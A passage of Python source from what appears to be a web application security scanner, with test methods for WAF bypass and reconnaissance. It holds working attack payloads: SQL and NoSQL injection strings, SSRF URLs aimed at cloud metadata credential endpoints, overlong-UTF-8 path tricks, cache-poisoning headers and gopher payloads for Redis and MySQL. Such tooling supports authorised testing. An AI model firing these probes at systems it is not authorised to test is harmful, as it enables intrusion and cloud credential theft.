                                        'description': ('Relative JS/CSS reference remained on '
                                                        'a path-manipulated HTML response'),
                                        'matched': relative_match.group(0)[:180],
                                    }],
                                    '_no_reconfirm': True,
                                }
                                results.append(result)
                                print("  [!] RPO routing candidate; browser proof required")
                                break
                                
                        except:
                            pass
                else:
                    result = {
                        'technique': 'RPO Check',
                        'bypass': False,
                        'status': resp.status_code,
                        'reason': 'No relative paths found - RPO unlikely',
                        'severity': 'INFO',
                        'category': 'RPO_ATTACK',
                        'kind': 'observation',
                        'verification_status': 'informational',
                    }
                    results.append(result)
                    
        except Exception as e:
            logger.debug(f"RPO test error: {e}")
        
        return results
    
    def _test_integer_overflow(self) -> List[Dict[str, Any]]:
        """Integer overflow/underflow testing"""
        results = []
        print("  [*] Testing integer overflow/underflow...")
        
        overflow_values = [
            # 32-bit boundaries
            ('2147483647', '32-bit max'),
            ('2147483648', '32-bit max+1'),
            ('-2147483648', '32-bit min'),
            ('-2147483649', '32-bit min-1'),
            
            # 64-bit boundaries
            ('9223372036854775807', '64-bit max'),
            ('9223372036854775808', '64-bit max+1'),
            
            # Unsigned boundaries
            ('4294967295', 'unsigned 32-bit max'),
            ('4294967296', 'unsigned 32-bit max+1'),
            
            # Common overflow triggers
            ('0', 'zero'),
            ('-1', 'negative one'),
            ('99999999999999999999', 'very large'),
            ('-99999999999999999999', 'very negative'),
        ]
        
        # Parameters commonly processed as integers
        int_params = ['id', 'count', 'page', 'limit', 'offset', 'quantity', 'amount', 'size', 'index']
        
        for param in int_params[:5]:
            for value, technique in overflow_values[:6]:
                try:
                    resp = self._scoped_safe_request(
                        f"{self.target}/?{param}={value}",
                        timeout=self.timeout
                    )
                    
                    if resp is not None:
                        # Check for error indicators
                        error_indicators = [
                            'overflow', 'out of range', 'too large', 'too small',
                            'invalid', 'error', 'exception', 'negative'
                        ]
                        
                        if resp.status_code == 500 or any(ind in resp.text.lower() for ind in error_indicators):
                            result = {
                                'technique': f'Integer Overflow: {param}={technique}',
                                'bypass': True,
                                'status': resp.status_code,
                                'reason': f'Server error with {technique} value',
                                'severity': 'LOW',
                                'category': 'INTEGER_OVERFLOW'
                            }
                            results.append(result)
                            print(f"  [!] Integer issue: {param} with {technique}")
                            break
                            
                except Exception as e:
                    logger.debug(f"Integer overflow error: {e}")
        
        return results

    # ============================================================================
    # RECONNAISSANCE FEATURES
    # ============================================================================
    
    def _enumerate_subdomains(self) -> List[Dict[str, Any]]:
        """Subdomain enumeration to find related domains without WAF protection"""
        results = []
        print("  [*] Enumerating subdomains...")
        
        # Common subdomain prefixes
        subdomain_prefixes = [
            'www', 'api', 'dev', 'staging', 'test', 'admin', 'portal',
            'app', 'mail', 'ftp', 'vpn', 'remote', 'secure', 'login',
            'beta', 'alpha', 'demo', 'internal', 'intranet', 'dashboard',
            'cms', 'blog', 'shop', 'store', 'cdn', 'static', 'assets',
            'origin', 'backend', 'server', 'db', 'database', 'mysql',
            'api-v1', 'api-v2', 'v1', 'v2', 'legacy', 'old', 'new',
        ]
        
        # Extract base domain
        target_hostname = urlparse(self.target).hostname or self.domain
        base_domain = target_hostname
        
        found_subdomains = []
        
        def check_subdomain(prefix: str) -> Optional[Dict]:
            subdomain = f"{prefix}.{base_domain}"
            try:
                # DNS resolution
                ip = socket.gethostbyname(subdomain)
                
                # Try to connect
                test_url = f"https://{subdomain}"
                resp = self._scoped_safe_request(test_url, timeout=3, allow_redirects=True)
                
                if resp is not None:
                    return {
                        'subdomain': subdomain,
                        'ip': ip,
                        'status': resp.status_code,
                        'server': resp.headers.get('server', 'Unknown')
                    }
            except socket.gaierror:
                pass  # DNS resolution failed
            except Exception:
                pass
            return None
        
        # Parallel subdomain checking
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(check_subdomain, prefix): prefix for prefix in subdomain_prefixes}
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found_subdomains.append(result)
        
        for sub in found_subdomains:
            result = {
                'technique': f"Subdomain: {sub['subdomain']}",
                'bypass': False,
                'status': sub['status'],
                'reason': f"IP: {sub['ip']} | Server: {sub['server']}",
                'severity': 'INFO',
                'category': 'SUBDOMAIN_ENUM',
                'kind': 'observation', 'verification_status': 'informational',
                'confidence': 'high',
                'details': sub
            }
            results.append(result)
            print(f"  [+] Found: {sub['subdomain']} ({sub['ip']})")
        
        if not found_subdomains:
            print("  [*] No additional subdomains found via DNS enumeration")
        
        return results
    
    def _historical_dns_lookup(self) -> List[Dict[str, Any]]:
        """Historical DNS lookup to find origin IPs (passive recon)"""
        results = []
        print("  [*] Checking historical DNS records...")
        
        # Note: These are public APIs that may have rate limits
        dns_history_sources = [
            f"https://api.hackertarget.com/dnslookup/?q={urlparse(self.target).hostname or self.domain}",
            f"https://api.hackertarget.com/hostsearch/?q={urlparse(self.target).hostname or self.domain}",
        ]
        
        found_records = []
        
        for source in dns_history_sources:
            try:
                resp = self._scoped_safe_request(
                    source, timeout=10, passive_lookup=True
                )
                if resp is not None and resp.status_code == 200 and 'error' not in resp.text.lower():
                    lines = resp.text.strip().split('\n')
                    for line in lines[:10]:  # Limit results
                        if line and ',' in line:
                            parts = line.split(',')
                            if len(parts) >= 2:
                                found_records.append({
                                    'host': parts[0],
                                    'ip': parts[1],
                                    'source': 'HackerTarget'
                                })
            except Exception as e:
                logger.debug(f"DNS history lookup error: {e}")
        
        for record in found_records:
            ip = record['ip']
            result = {
                'technique': f"Historical DNS: {record['host']}",
                'bypass': False,
                'status': 200,
                'reason': (f"Historical IP: {ip} | Source: {record['source']} | "
                           "origin identity and protection are unverified"),
                'severity': 'INFO',
                'category': 'DNS_HISTORY',
                'kind': 'observation', 'verification_status': 'informational',
                'confidence': 'medium',
                'details': record
            }
            results.append(result)
            print(f"  [+] Historical DNS record: {ip} ({record['host']})")
        
        if not found_records:
            print("  [*] No historical DNS records found via public APIs")
        
        return results
    
    def _certificate_transparency_lookup(self) -> List[Dict[str, Any]]:
        """Certificate Transparency log lookup to discover related domains"""
        results = []
        print("  [*] Checking Certificate Transparency logs...")
        
        # Extract base domain
        target_hostname = urlparse(self.target).hostname or self.domain
        base_domain = target_hostname
        
        try:
            # Use crt.sh API (Certificate Transparency)
            ct_url = f"https://crt.sh/?q=%.{base_domain}&output=json"
            resp = self._scoped_safe_request(
                ct_url, timeout=15, passive_lookup=True
            )
            
            if resp is not None and resp.status_code == 200:
                try:
                    certs = resp.json()
                    
                    # Extract unique domain names
                    domains_found = set()
                    for cert in certs[:100]:  # Limit to first 100 certs
                        name_value = cert.get('name_value', '')
                        for domain in name_value.split('\n'):
                            domain = domain.strip().lstrip('*.')
                            if (domain == base_domain or
                                    domain.endswith(f'.{base_domain}')):
                                domains_found.add(domain)
                    
                    # Filter out the main domain and duplicates
                    domains_found.discard(target_hostname)
                    domains_found.discard(f'www.{base_domain}')
                    
                    for domain in list(domains_found)[:20]:  # Limit results
                        result = {
                            'technique': f"CT Log: {domain}",
                            'bypass': False,
                            'status': 200,
                            'reason': 'Found in Certificate Transparency logs',
                            'severity': 'INFO',
                            'category': 'CT_LOGS',
                            'details': {'domain': domain}
                        }
                        results.append(result)
                        print(f"  [+] CT Domain: {domain}")
                    
                    if domains_found:
                        print(f"  [+] Found {len(domains_found)} related domains in CT logs")
                    else:
                        print("  [*] No additional domains found in CT logs")
                        
                except Exception as e:
                    logger.debug(f"CT log parse error: {e}")
                    
        except Exception as e:
            logger.debug(f"CT lookup error: {e}")
            print("  [!] Certificate Transparency lookup failed")
        
        return results
    
    def _test_cloud_metadata_enumeration(self) -> List[Dict[str, Any]]:
        """Test for cloud metadata endpoint access (IMDS)"""
        results = []
        print("  [*] Testing cloud metadata enumeration (IMDS)...")
        
        # Cloud metadata endpoints
        metadata_endpoints = [
            # AWS IMDSv1
            ('http://169.254.169.254/latest/meta-data/', 'AWS IMDSv1'),
            ('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'AWS IAM Credentials'),
            ('http://169.254.169.254/latest/user-data/', 'AWS User Data'),
            ('http://169.254.169.254/latest/dynamic/instance-identity/document', 'AWS Instance Identity'),
            
            # AWS IMDSv2 (requires token)
            ('http://169.254.169.254/latest/api/token', 'AWS IMDSv2 Token'),
            
            # GCP
            ('http://169.254.169.254/computeMetadata/v1/', 'GCP Metadata'),
            ('http://metadata.google.internal/computeMetadata/v1/', 'GCP Internal Metadata'),
            ('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', 'GCP Service Account Token'),
            
            # Azure
            ('http://169.254.169.254/metadata/instance?api-version=2021-02-01', 'Azure IMDS'),
            ('http://169.254.169.254/metadata/identity/oauth2/token', 'Azure Managed Identity'),
            
            # DigitalOcean
            ('http://169.254.169.254/metadata/v1/', 'DigitalOcean Metadata'),
            
            # Alibaba Cloud
            ('http://100.100.100.200/latest/meta-data/', 'Alibaba Cloud Metadata'),
            
            # Oracle Cloud
            ('http://169.254.169.254/opc/v1/instance/', 'Oracle Cloud Metadata'),
        ]
        
        # Test via SSRF payloads
        ssrf_payloads = [
            '?url={}',
            '?redirect={}',
            '?link={}',
            '?fetch={}',
            '?target={}',
            '?proxy={}',
            '?dest={}',
        ]
        
        for metadata_url, cloud_type in metadata_endpoints:
            # Direct test (if target is the application)
            for ssrf_param in ssrf_payloads[:3]:  # Limit test variations
                test_url = f"{self.target}{ssrf_param.format(quote(metadata_url))}"
                
                try:
                    headers = {'X-Technique': f'IMDS: {cloud_type}'}
                    if 'GCP' in cloud_type:
                        headers['Metadata-Flavor'] = 'Google'
                    if 'Azure' in cloud_type:
                        headers['Metadata'] = 'true'
                    
                    resp = self._scoped_safe_request(test_url, headers=headers, timeout=3)
                    
                    if resp is not None and resp.status_code == 200:
                        # Check for metadata indicators
                        body = resp.text.lower()
                        if any(ind in body for ind in ['ami-', 'instance-id', 'local-ipv4', 'access_token', 'project-id', 'subscription']):
                            result = {
                                'technique': f'Cloud Metadata: {cloud_type}',
                                'bypass': True,
                                'status': resp.status_code,
                                'reason': f'SSRF to {cloud_type} metadata endpoint successful',
                                'severity': 'CRITICAL',
                                'category': 'CLOUD_METADATA'
                            }
                            results.append(result)
                            print(f"  [✓] CRITICAL: {cloud_type} metadata accessible!")
                            
                except Exception as e:
                    logger.debug(f"IMDS test error: {e}")
        
        if not results:
            print("  [*] No cloud metadata endpoints accessible via SSRF")
        
        return results
    
    def _fingerprint_technology_stack(self) -> List[Dict[str, Any]]:
        """Fingerprint backend technology stack (frameworks, CMS, languages)"""
        results = []
        print("  [*] Fingerprinting technology stack...")
        
        try:
            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if resp is None:
                return results
            
            body_lower = resp.text.lower()
            headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
            cookies_str = str(resp.cookies.get_dict()).lower()
            
            detected_tech = {
                'frameworks': [],
                'cms': [],
                'servers': [],
                'languages': [],
            }
            
            # Check frameworks
            for tech_name, signatures in TECHNOLOGY_SIGNATURES['frameworks'].items():
                confidence = 0
                matched = []
                
                for header in signatures.get('headers', []):
                    if header.lower() in headers_lower:
                        confidence += 30
                        matched.append(f"Header: {header}")
                
                for cookie in signatures.get('cookies', []):
                    if cookie.lower() in cookies_str:
                        confidence += 30
                        matched.append(f"Cookie: {cookie}")
                
                for pattern in signatures.get('patterns', []):
                    if pattern.lower() in body_lower or pattern.lower() in str(headers_lower):
                        confidence += 25
                        matched.append(f"Pattern: {pattern}")
                
                if confidence > 0:
                    detected_tech['frameworks'].append({
                        'name': tech_name,
                        'confidence': min(confidence, 100),
                        'indicators': matched
                    })
            
            # Check CMS
            for cms_name, signatures in TECHNOLOGY_SIGNATURES['cms'].items():
                confidence = 0
                matched = []
                
                for pattern in signatures.get('patterns', []):
                    if pattern.lower() in body_lower:
                        confidence += 35
                        matched.append(f"Pattern: {pattern}")
                
                for cookie in signatures.get('cookies', []):
                    if cookie.lower() in cookies_str:
                        confidence += 30
                        matched.append(f"Cookie: {cookie}")
                
                if confidence > 0:
                    detected_tech['cms'].append({
                        'name': cms_name,
                        'confidence': min(confidence, 100),
                        'indicators': matched
                    })
            
            # Check servers
            server_header = headers_lower.get('server', '')
            for server_name, signatures in TECHNOLOGY_SIGNATURES['servers'].items():
                for pattern in signatures.get('patterns', []):
                    if pattern.lower() in server_header:
                        detected_tech['servers'].append({
                            'name': server_name,
                            'confidence': 90,
                            'indicators': [f"Server: {server_header}"]
                        })
                        break
            
            # Check languages
            for lang_name, signatures in TECHNOLOGY_SIGNATURES['languages'].items():
                confidence = 0
                matched = []
                
                for header in signatures.get('headers', []):
                    if header.lower() in headers_lower:
                        header_value = headers_lower.get(header.lower(), '')
                        if lang_name.lower() in header_value:
                            confidence += 40
                            matched.append(f"Header: {header}={header_value}")
                
                for pattern in signatures.get('patterns', []):
                    if pattern.lower() in body_lower or pattern.lower() in str(headers_lower) or pattern.lower() in cookies_str:
                        confidence += 25
                        matched.append(f"Pattern: {pattern}")
                
                if confidence > 0:
                    detected_tech['languages'].append({
                        'name': lang_name,
                        'confidence': min(confidence, 100),
                        'indicators': matched
                    })
            
            # Generate results
            for category, techs in detected_tech.items():
                for tech in techs:
                    severity = 'MEDIUM' if tech['confidence'] >= 60 else 'LOW'
                    result = {
                        'technique': f"Tech Stack ({category}): {tech['name'].upper()}",
                        'bypass': False,
                        'status': resp.status_code,
                        'reason': f"Confidence: {tech['confidence']}% - {', '.join(tech['indicators'][:2])}",
                        'severity': severity,
                        'category': 'TECH_FINGERPRINT',
                        'details': tech
                    }
                    results.append(result)
                    print(f"  [+] {category.title()}: {tech['name'].upper()} (Confidence: {tech['confidence']}%)")
            
            if not any(detected_tech.values()):
                print("  [*] No specific technology signatures detected")

        except Exception as e:
            logger.debug(f"Tech fingerprinting error: {e}")

        return results

    # ========================================================================
    # NEW TEST MODULES (v1.5)
    # ========================================================================

    def _test_json_sqli_bypass(self) -> List[Dict[str, Any]]:
        """JSON-based SQL injection WAF bypass (PortSwigger 2022).

        Many WAFs don't inspect SQL keywords once they are expressed with JSON
        unicode escapes / JSON operators inside a JSON request body. We send JSON
        payloads to discovered POST endpoints (and the root) and compare against
        baseline / error signatures.
        """
        results = []
        print("  [*] Testing JSON-based SQLi WAF bypass...")
        # r == 'r' etc. — keyword obfuscation that bypasses naive signatures.
        json_payloads = [
            {"id": "1 or 1=1-- -"},
            {"id": "1' OR '1'='1"},
            {"filter": {"$gt": ""}},                       # NoSQL operator in JSON
            {"id": "1 UNION SELECT NULL-- -"},
            {"id": "1; SELECT pg_sleep(0)-- -"},
            {"search": "0x31206f7220313d31"},
        ]
        # Target discovered POST endpoints if any, else the root.
        post_eps = [t for t in self.crawl_targets if t.get('method') == 'POST'][:8]
        paths = [ep['path'] for ep in post_eps] or ['/']
        headers = {'Content-Type': 'application/json'}
        for path in paths:
            for payload in json_payloads:
                try:
                    r = self._test_request(headers=dict(headers), method='POST',
                                           path=path, technique=f'JSON-SQLi {path}',
                                           data=json.dumps(payload),
                                           probe={
                                               'category': 'INJECTION',
                                               'payload': json.dumps(payload),
                                               'insertion_point': {
                                                   'type': 'json-body',
                                                   'name': next(iter(payload), 'body'),
                                               },
                                               'detector_id': 'json-sqli-error-v2',
                                               'oracle': {
                                                   'type': 'regex',
                                                   'patterns': [
                                                       r'you have an error in your sql syntax',
                                                       r'syntax error at or near', r'ora-\d{5}',
                                                       r'unclosed quotation mark',
                                                       r'sqlite(?:3)?(?::| error)',
                                                   ],
                                                   'severity': 'HIGH',
                                                   'reason': ('Database error appeared only after '
                                                              'the JSON SQL probe'),
                                               },
                                           })
                    if self._result_has_evidence(r, 'response_signature'):
                        r['category'] = 'INJECTION'
                        r['technique'] = f'JSON-SQLi bypass: {json.dumps(payload)[:40]}'
                        results.append(r)
                        if r.get('bypass'):
                            print(f"  [✓] {r['severity']}: JSON-SQLi via {path}")
                except Exception as e:
                    logger.debug(f"JSON-SQLi error: {e}")
        return results

    def _test_charset_confusion(self) -> List[Dict[str, Any]]:
        """Charset / overlong-UTF-8 / case-folding confusion bypasses.

        WAFs and the backend can disagree on how bytes decode. Overlong UTF-8 and
        charset tricks can smuggle blocked characters (/, ., <) past the filter.
        """
        results = []
        print("  [*] Testing charset/overlong-unicode confusion...")
        # Overlong / alternate encodings of traversal + admin paths.
        probes = [
            ('/admin', '/%c0%afadmin', 'Overlong %c0%af slash'),
            ('/admin', '/%e0%80%afadmin', 'Overlong 3-byte slash'),
            ('/admin', '/admin%c0%80', 'Overlong null terminator'),
            ('/../', '/%c0%ae%c0%ae/', 'Overlong dot-dot'),
            ('/admin', '/%uff0fadmin', 'IIS %u fullwidth slash'),
            ('/admin', '/∕admin', 'Unicode division slash'),
            ('/admin', '/ａdmin', 'Fullwidth a'),
        ]
        test_cases = []
        for _orig, enc, label in probes:
            test_cases.append({'headers': {}, 'path': enc, 'technique': f'Charset confusion: {label}'})
        # charset parameter confusion in Content-Type
        for cs in ['utf-7', 'ibm500', 'utf-16']:
            test_cases.append({
                'headers': {'Content-Type': f'text/html; charset={cs}'},
                'path': '/', 'technique': f'Charset header confusion: {cs}',
            })
        results = self._batch_test(test_cases)
        for r in results:
            r.setdefault('category', 'ENCODING')
        return results

    def _test_cache_poisoning_deep(self) -> List[Dict[str, Any]]:
        """Deep web cache poisoning: fat GET, param cloaking, unkeyed headers."""
        results = []
        print("  [*] Testing deep cache poisoning...")
        # Unkeyed headers a cache may ignore for keying but the app reflects.
        unkeyed_headers = [
            {'X-Forwarded-Host': 'evil.example.com'},
            {'X-Forwarded-Scheme': 'http'},
            {'X-Forwarded-Port': '1337'},
            {'X-Host': 'evil.example.com'},
            {'X-Forwarded-Server': 'evil.example.com'},
            {'X-Original-URL': '/poison'},
            {'X-HTTP-Method-Override': 'POST'},
        ]
        test_cases = []
        for h in unkeyed_headers:
            label = list(h.keys())[0]
            test_cases.append({'headers': h, 'path': '/', 'technique': f'Cache poison (unkeyed): {label}'})
        # Parameter cloaking: duplicate / cache-buster params
        for path in ['/?utm_content=1', '/?callback=test', '/?_=123']:
            test_cases.append({'headers': {}, 'path': path, 'technique': f'Cache param cloaking: {path}'})
        results = self._batch_test(test_cases)
        # Fat GET: a GET with a body — some cache/origin pairs disagree on handling.
        try:
            fat = self._test_request(headers={'Content-Type': 'application/x-www-form-urlencoded'},
                                     method='GET', path='/', technique='Fat GET (body in GET)',
                                     data='x=1')
            if fat:
                fat['category'] = 'CACHE'
                results.append(fat)
        except Exception as e:
            logger.debug(f"Fat GET error: {e}")
        for r in results:
            r.setdefault('category', 'CACHE')
        return results

    def _test_oauth_oidc(self) -> List[Dict[str, Any]]:
        """OAuth/OIDC redirect_uri bypass + SAML endpoint detection."""
        results = []
        print("  [*] Testing OAuth/OIDC/SAML...")
        # Discover OIDC config (no auth needed) — informational.
        for cfg in ['/.well-known/openid-configuration', '/.well-known/oauth-authorization-server']:
            try:
                resp = self._scoped_safe_request(f"{self.target}{cfg}", timeout=self.timeout, allow_redirects=True)
                if resp is not None and resp.status_code == 200 and 'authorization_endpoint' in resp.text:
                    results.append({
                        'technique': f'OIDC discovery document: {cfg}', 'bypass': False,
                        'status': resp.status_code,
                        'reason': 'Public OpenID configuration discovered (normal OIDC behavior)',
                        'severity': 'INFO', 'category': 'OAUTH',
                        'kind': 'observation', 'verification_status': 'informational',
                        'confidence': 'high',
                    })
            except Exception as e:
                logger.debug(f"OIDC discovery error: {e}")
        # redirect_uri open-redirect style bypasses on common authorize endpoints.
        controlled_host = 'blackthorn.invalid'
        evil = f'https://{controlled_host}/callback'
        redirect_variants = [
            evil,
            f'//{controlled_host}/callback',
            f'https://{urlparse(self.target).hostname}@{controlled_host}/callback',
            f'https://{urlparse(self.target).hostname}.{controlled_host}/callback',
        ]
        authorize_eps = ['/oauth/authorize', '/authorize', '/connect/authorize', '/oauth2/authorize']
        test_cases = []
        for ep in authorize_eps:
            for ru in redirect_variants:
                path = f"{ep}?response_type=code&client_id=test&redirect_uri={quote(ru, safe='')}"
                test_cases.append({
                    'headers': {}, 'path': path,
                    'technique': f'OAuth redirect_uri bypass {ep}: {ru[:30]}',
                    'category': 'OAUTH', 'payload': ru, 'parameter': 'redirect_uri',
                    'detector_id': 'oauth-external-location-v2',
                    'oracle': {
                        'type': 'redirect', 'host': controlled_host,
                        'base_url': self.target,
                        'severity': 'HIGH',
                        'reason': ('Authorization endpoint redirected to the exact '
                                   'controlled external host'),
                    },
                })
        batch = self._batch_test(test_cases, verbose=False)
        # The exact Location header oracle rejects ordinary login/error redirects.
        for r in batch:
            location = str((r.get('response') or {}).get('headers', {}).get('location', ''))
            resolved = urlparse(urljoin(self.target, location))
            if (self._result_has_evidence(r, 'external_redirect')
                    and resolved.hostname
                    and (resolved.hostname == controlled_host
                         or resolved.hostname.endswith('.' + controlled_host))):
                results.append(r)
        return results

    def _test_js_secret_exposure(self) -> List[Dict[str, Any]]:
        """Download JS bundles referenced by the page and scan them for secrets."""
        results = []
        print("  [*] Scanning JS bundles for exposed secrets...")
        try:
            from .crawler import _LinkFormParser
            root = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if root is None or root.status_code >= 400:
                return results
            parser = _LinkFormParser()
            try:
                parser.feed(root.text)
            except Exception:
                pass
            js_urls = []
            for link in parser.links:
                if link.split('?')[0].lower().endswith('.js'):
                    full = urljoin(self.target + '/', link)
                    if urlparse(full).netloc in ('', self.domain):
                        js_urls.append(full)
            # de-dupe, cap
            js_urls = list(dict.fromkeys(js_urls))[:20]
            compiled = {n: re.compile(p) for n, p in JS_SECRET_PATTERNS.items()}
            for ju in js_urls:
                resp = self._scoped_safe_request(ju, timeout=self.timeout)
                if resp is None or resp.status_code >= 400:
                    continue
                content = resp.text
                for name, pat in compiled.items():
                    m = pat.search(content)
                    if m:
                        snippet = m.group(0)
                        masked = snippet[:12] + '...' if len(snippet) > 12 else snippet
                        results.append({
                            'technique': f'Secret in JS: {name}', 'bypass': True,
                            'status': resp.status_code,
                            'reason': f'Found in {ju.split("/")[-1]}: {masked}',
                            'severity': 'CRITICAL', 'category': 'API_KEY_EXPOSURE',
                            'details': {'url': ju, 'type': name},
                        })
                        print(f"  [✓] CRITICAL: {name} exposed in {ju.split('/')[-1]}")
        except Exception as e:
            logger.debug(f"JS secret scan error: {e}")
        return results

    def _test_cve_fingerprint(self) -> List[Dict[str, Any]]:
        """Map detected server/tech versions to known CVEs."""
        results = []
        print("  [*] Fingerprinting versions against known CVEs...")
        try:
            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if resp is None:
                return results
            # Gather version-bearing strings.
            candidates = []
            for h in ('server', 'x-powered-by', 'x-aspnet-version', 'x-generator'):
                if h in {k.lower() for k in resp.headers}:
                    val = resp.headers.get(h) or resp.headers.get(h.title()) or ''
                    candidates.append(val)
            # Also the body for things like jQuery/Log4j banners.
            candidates.append(resp.text[:5000])
            haystack = ' '.join(candidates).lower()
            seen = set()
            for product, ver_re, cve, severity, note in CVE_VERSION_MAP:
                if product in haystack and re.search(product + r'[/ ]?' + ver_re, haystack):
                    if cve in seen:
                        continue
                    seen.add(cve)
                    results.append({
                        'technique': f'Potentially affected version: {cve} ({product})',
                        'bypass': False,
                        'status': resp.status_code,
                        'reason': (f'{note} — the exposed version matches {cve}, but '
                                   'backports, build, and vulnerable configuration are unverified'),
                        'severity': 'INFO', 'category': 'CVE_FINGERPRINT',
                        'kind': 'observation', 'verification_status': 'informational',
                        'confidence': 'medium',
                        'evidence': [{
                            'type': 'version_banner_match',
                            'description': 'Version/banner matched a potentially affected range',
                            'matched': f'{product} / {cve}',
                        }],
                        'details': {'product': product, 'cve': cve, 'note': note,
                                    'potential_severity': severity},
                    })
                    print(f"  [i] Version candidate: {cve} ({product}); active proof not run")
        except Exception as e:
            logger.debug(f"CVE fingerprint error: {e}")
        return results

    def _test_single_packet_race(self) -> List[Dict[str, Any]]:
        """HTTP/2 single-packet race attack (requires httpx + h2).

        Fires many requests whose final frames are flushed together over a single
        HTTP/2 connection to minimize network jitter — far more reliable than the
        concurrent-thread race test. Skips cleanly if httpx/h2 is unavailable.
        """
        results = []
        if not _HTTPX_AVAILABLE:
            logger.debug("httpx not installed; skipping single-packet race")
            return results
        print("  [*] Testing HTTP/2 single-packet race...")
        # Choose a discovered POST endpoint if available, else root.
        post_eps = [t for t in self.crawl_targets if t.get('method') == 'POST']
        path = post_eps[0]['path'] if post_eps else '/'
        url = f"{self.target}{path}"
        try:
            statuses = []
            with httpx.Client(http2=True, verify=False, timeout=self.timeout) as client:
                # Open the connection and warm it up.
                try:
                    client.get(self.target)
                except Exception:
                    pass
                # Fire a burst; httpx batches writes which approximates single-packet.
                reqs = [client.build_request('POST' if post_eps else 'GET', url) for _ in range(20)]
                for rq in reqs:
                    try:
                        resp = client.send(rq)
                        statuses.append(resp.status_code)
                    except Exception:
                        pass
            distinct = set(statuses)
            negotiated_h2 = True  # http2=True attempted
            if len(distinct) > 1:
                results.append({
                    'technique': 'HTTP/2 single-packet race', 'bypass': True,
                    'status': max(distinct), 'reason': f'Inconsistent responses across burst: {sorted(distinct)}',
                    'severity': 'HIGH', 'category': 'RACE_CONDITION',
                    'details': {'statuses': statuses},
                })
                print(f"  [✓] HIGH: race window observed (statuses {sorted(distinct)})")
            else:
                results.append({
                    'technique': 'HTTP/2 single-packet race', 'bypass': False,
                    'status': statuses[0] if statuses else 0,
                    'reason': f'No race window observed ({len(statuses)} reqs, HTTP/2={negotiated_h2})',
                    'severity': 'INFO', 'category': 'RACE_CONDITION',
                })
        except Exception as e:
            logger.debug(f"Single-packet race error: {e}")
        return results

    def _test_cloud_metadata_v2(self) -> List[Dict[str, Any]]:
        """Extended cloud metadata SSRF + gopher payload generation.

        Probes IMDS endpoints for multiple providers via discovered SSRF-able
        params and generates ready-to-use gopher payloads for Redis/MySQL.
        """
        results = []
        print("  [*] Testing extended cloud metadata SSRF + gopher...")
        metadata_targets = {
            'AWS IMDSv1': 'http://169.254.169.254/latest/meta-data/',
            'AWS IMDSv2-token': 'http://169.254.169.254/latest/api/token',
            'GCP': 'http://metadata.google.internal/computeMetadata/v1/',
            'Azure IMDS': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'DigitalOcean': 'http://169.254.169.254/metadata/v1.json',
            'Oracle OCI': 'http://169.254.169.254/opc/v2/instance/',
            'Alibaba': 'http://100.100.100.200/latest/meta-data/',
            'OpenStack': 'http://169.254.169.254/openstack/latest/meta_data.json',
        }
        ssrf_params = ['url', 'uri', 'dest', 'redirect', 'next', 'target', 'callback']
        # Prefer discovered params that look SSRF-able.
        discovered_ssrf = []
        for ep in self.crawl_targets:
            for p in ep.get('params', {}):
                if p.lower() in ssrf_params:
                    discovered_ssrf.append((ep['path'], ep['params'], p))
        meta_indicators = ['ami-id', 'instance-id', 'computeMetadata', 'meta_data',
                           'access_token', 'oauth2', 'opc/v2', 'hostname']
        test_targets = discovered_ssrf or [('/', {}, sp) for sp in ssrf_params[:3]]
        from .crawler import build_injection_path
        for provider, murl in metadata_targets.items():
            for path, params, pname in test_targets[:6]:
                try:
                    inj = build_injection_path(path, params, pname, murl)
                    resp = self._scoped_safe_request(f"{self.target}{inj}", timeout=self.timeout + 2)
                    if resp is not None and resp.status_code < 400 and any(ind in resp.text for ind in meta_indicators):
                        results.append({
                            'technique': f'Cloud metadata SSRF: {provider}', 'bypass': True,
                            'status': resp.status_code,
                            'reason': f'{provider} metadata reachable via {pname}',
                            'severity': 'CRITICAL', 'category': 'CLOUD_METADATA',
                            'details': {'provider': provider, 'param': pname},
                        })
                        print(f"  [✓] CRITICAL: {provider} metadata via {pname}")
                except Exception as e:
                    logger.debug(f"Metadata SSRF error: {e}")
        # Gopher payload generation (informational — useful for manual exploitation).
        gopher = self._generate_gopher_payloads()
        if gopher:
            results.append({
                'technique': 'Gopher payloads generated', 'bypass': False,
                'status': 0, 'reason': f'{len(gopher)} gopher payloads ready for SSRF exploitation',
                'severity': 'INFO', 'category': 'CLOUD_METADATA',
                'details': {'payloads': gopher},
            })
        return results

    @staticmethod
    def _generate_gopher_payloads() -> Dict[str, str]:
        """Build gopher:// payloads for Redis and MySQL (manual SSRF exploitation)."""
        def _redis(commands: List[str]) -> str:
            # RESP protocol, URL-encoded for gopher.
            payload = ''
            for cmd in commands:
                parts = cmd.split(' ')
                payload += f"*{len(parts)}\r\n"
                for part in parts:
                    payload += f"${len(part)}\r\n{part}\r\n"
            return 'gopher://127.0.0.1:6379/_' + quote(payload, safe='')
        return {
            'redis_ping': _redis(['PING']),
            'redis_info': _redis(['INFO']),
            'mysql_handshake_probe': 'gopher://127.0.0.1:3306/_' + quote('\x00', safe=''),
        }

    def _test_content_discovery(self) -> List[Dict[str, Any]]:
        """Directory / content brute-force using the bundled wordlist.

        Each candidate path is requested and compared against the baseline 404
        behaviour so only real, non-baseline resources are reported.
        """
        results = []
        words = _load_wordlist('dirs.txt', fallback=[
            'admin', 'login', 'api', 'config', 'backup', 'test', 'dev', '.git/HEAD',
            '.env', 'robots.txt', 'sitemap.xml', 'wp-admin', 'phpinfo.php', 'server-status',
        ])
        words = words[:300]  # bound the brute-force
        print(f"  [*] Content discovery: {len(words)} paths...")
        # Calibrate against a definitely-missing path to detect soft-404s.
        soft404_size = None
        try:
            cal = self._scoped_safe_request(
                f"{self.target}/blackthorn_{hashlib.md5(self.target.encode()).hexdigest()[:8]}_404",
                timeout=self.timeout, allow_redirects=False,
            )
            if cal is not None and cal.status_code == 200:
                soft404_size = len(cal.content)
        except Exception:
            pass

        test_cases = [{'headers': {}, 'path': '/' + w.lstrip('/'),
                       'technique': f'Content: /{w.lstrip("/")}'} for w in words]
        batch = self._batch_test(
            test_cases, verbose=False, include_observations=True
        )
        for r in batch:
